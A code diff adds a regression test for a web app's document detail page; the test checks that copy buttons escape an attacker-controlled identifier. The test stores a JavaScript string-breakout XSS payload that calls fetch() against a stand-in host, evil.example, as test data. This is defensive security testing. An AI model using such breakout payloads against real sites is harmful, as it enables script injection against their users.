@@ -403,6 +403,43 @@ class TestUriDetailPage:
         assert "ツリーで表示" in resp.text
         assert "CFPackage API" in resp.text
 
+    async def test_copy_button_does_not_inline_value_xss(
+        self,
+        db_session: AsyncSession,
+        db_client,
+        tenant: Tenant,
+        sample_document: CFDocument,
+    ):
+        """Copy buttons must not interpolate values into inline JS. A malicious
+        association node identifier (a String column, attacker-controllable via
+        CFPackage import) with a JS-string-breakout payload must not produce an
+        executable onclick — the value belongs in an autoescaped data-copy attr."""
+        ident = uuid.uuid4()
+        payload = "x'); fetch('//evil.example'); ('"
+        assoc = CFAssociation(
+            tenant_id=tenant.id,
+            cf_document_id=sample_document.id,
+            identifier=ident,
+            uri="https://example.com/assoc",
+            association_type="isRelatedTo",
+            origin_node_identifier="o",
+            origin_node_uri="https://example.com/o",
+            destination_node_identifier=payload,
+            destination_node_uri="https://example.com/d",
+            last_change_date_time=NOW,
+        )
+        db_session.add(assoc)
+        await db_session.flush()
+
+        resp = await db_client.get(f"/{tenant.id}/uri/{ident}")
+        assert resp.status_code == 200
+        # No inline clipboard JS carrying a value at all.
+        assert "writeText('" not in resp.text
+        # The breakout sequence must not appear unescaped (autoescape turns the
+        # single quote into &#39; inside the data-copy attribute).
+        assert "'); fetch(" not in resp.text
+        assert "fetch(&#39;//evil.example&#39;)" in resp.text  # rendered, but inert
+
     async def test_cf_item_extensions_rendered(
         self,
         db_session: AsyncSession,
